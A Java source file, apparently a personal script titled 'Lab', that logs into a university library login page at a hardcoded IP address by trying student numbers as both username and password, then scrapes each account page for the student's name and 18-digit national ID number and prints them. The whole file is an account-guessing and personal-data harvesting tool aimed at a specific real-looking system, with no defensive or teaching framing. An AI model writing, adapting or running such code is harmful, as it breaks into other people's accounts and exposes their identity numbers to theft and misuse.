import java.io.*;
import java.net.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Lab {
    public static void main(String[] args) throws IOException {

        String url = "http://211.70.171.1/list/dzjs/login.asp";

        String urlnext = "http://211.70.171.1/list/dzjs/login_form.asp";

        String charset = "UTF-8";

        for(long i = 2015013915; i <= 2015013915; i++) {

            String param = new Long(i).toString();

            String query = String.format("user=%s&pw=%s", URLEncoder.encode(param, charset), URLEncoder.encode(param, charset));

            CookieHandler.setDefault(new CookieManager(null, CookiePolicy.ACCEPT_ALL));

            URLConnection connection = new URL(url + "?" + query).openConnection();

            List<String> cookies = connection.getHeaderFields().get("Set-Cookie");

            connection = new URL(urlnext).openConnection();

            BufferedReader bufr = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            String line = null;

            String regex = "\\d{17}\\S";

            String name = "【(\\S+)】";

            Pattern p = Pattern.compile(regex);

            Pattern namep = Pattern.compile(name);

            while ((line = bufr.readLine()) != null) {
//                System.out.println(line);
                Matcher m = p.matcher(line);
                if (m.find()) {
                    System.out.println("身份证" + m.group());
                }
                Matcher n = namep.matcher(line);
                if (n.find()) {
                    System.out.print("学号 " + i + "\t" + "姓名" + n.group(1) +"\t");
                }
            }
        }
    }

}


